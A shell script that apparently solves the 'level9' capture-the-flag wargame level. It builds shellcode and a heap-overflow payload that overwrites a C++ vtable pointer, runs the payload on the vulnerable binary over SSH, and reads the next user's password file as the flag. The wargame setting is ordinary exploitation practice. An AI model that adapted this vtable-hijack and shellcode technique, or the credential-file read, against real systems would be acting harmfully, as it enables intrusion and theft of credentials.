#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# #### #
# MAIN #
# #### #

generate_exploit_shellcode() {
    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d);

    nasm -f elf32 "$CURR_DIR_PATH/data/exploit.asm" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    unset tmpdir shellcode;
    return 0;
}

main() {
    host="${host:-localhost}";
    port="${port:-4242}";
    username="${username:-level9}";
    password="${password}";
    flag="";

    log "Authenticating to SSH server at $host:$port with username '$username' and password '$password'...";

    # 1. Hardcoded payload pieces
    malicious_vtbl="\020\240\004\010"; # (void *)[1] containing a pointer to the shellcode, injected immediately after (+0x4 bytes).
    shellcode="$(generate_exploit_shellcode)";
    malicious_vtbl_addr="\014\240\004\010" # Assuming the malicious_vtbl is at the start of the payload, it's also the address of `n1->annotation`.
    
    # 2. Padding
    intended_payload_length="112"; # (n2 - n1) + sizeof(n2->vptr) = `0x0804a078` - `0x0804a00c` + `0x4`
    padding="$((intended_payload_length - $(printf "%b%b%b" "$malicious_vtbl" "$shellcode" "$malicious_vtbl_addr" | wc -c)))";

    if [ "$padding" -lt "0" ]; then
        log "Error: provided shellcode is too long. Must be less than or equal to $intended_payload_length bytes, but it is $(printf "%b%b%b" "$malicious_vtbl" "$shellcode" "$malicious_vtbl_addr" | wc -c) bytes.";
        return 1;
    fi

    # 3. Generate the final payload
    payload="$(printf "%b%b%*c%b" "$malicious_vtbl" "$shellcode" "$padding" "c" "$malicious_vtbl_addr")";

    ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; }
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
    (
        printf '%s' 'sleep 1;'; # Not viable but should workout.
        printf '%s' 'cat '/home/user/bonus0/.pass' > /tmp/flag.txt;';
    )| ssh_exec_via_socket "$host" "$port" "$username" "./level9 '$payload'";
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; }
    
    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    log "Flag '$flag' has been written to '$flag_path'";
    echo -n "$flag" > "$flag_path";
}

main "$@";
